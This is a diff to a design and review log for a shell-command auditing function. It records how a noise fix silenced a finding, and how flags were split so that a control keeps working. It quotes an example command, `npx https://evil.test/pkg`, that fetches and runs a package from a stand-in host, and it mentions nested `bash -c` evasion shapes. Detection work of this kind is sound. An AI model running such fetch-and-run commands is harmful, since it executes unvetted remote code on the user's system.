@@ -341,6 +341,17 @@ block), not quieter, and H1 covers every interpreter family. Two more from the s
 command and was dropped in silence — operators are tokenised now; and `bash -c "bash -c '…'"` hit
 the recursion limit, which reported nothing, because a limit had been treated as a verdict.
 
+A ninth review found the **third finding in a row caused by a noise fix of mine**, and that is the
+pattern worth keeping. `interp` was doing two jobs — raising the H11 gap *and* gating the finding
+for code from a URL — so suppressing it to quieten `pnpm build` also silenced
+`npx https://evil.test/pkg`: `([], [])` once more. Each of the three went the same way: I lowered
+noise by clearing a flag, and a control was reading that flag. The two jobs now have two names —
+`named` is *a program we recognise ran here*, `interp` is *and it runs files, so a missing one is a
+gap* — and the rule for this function is that **a noise fix may never clear a flag a control
+reads**. With that split, `npx x` and `pnpm dlx x` also say what they are: a package fetched and run
+at every call, unpinned, which is H9's own definition — unless a local file was handed to the same
+runner, when nothing is fetched and the note is dropped.
+
 **The convergence test for this function is not "no findings left" — it is that every shape we
 cannot read ends in a finding.** Four of them now do: no file resolved (H11), code on stdin (H9
 block), inline code nested past the limit (H9 block), a token only a shell can finish (H9). What is
